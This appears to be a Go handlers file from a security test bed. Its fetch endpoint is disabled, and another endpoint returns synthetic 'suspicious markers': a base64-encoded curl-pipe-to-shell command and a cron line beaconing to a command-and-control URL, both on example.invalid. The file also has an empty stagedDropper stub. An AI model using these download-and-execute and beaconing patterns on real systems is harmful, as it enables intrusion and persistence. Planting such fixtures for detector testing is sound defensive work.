package handlers

import (
	"encoding/base64"
	"net/http"
	"net/url"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	if source == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if _, err := url.ParseRequestURI(source); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	_, _ = w.Write([]byte("fetch disabled\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	return nil
}
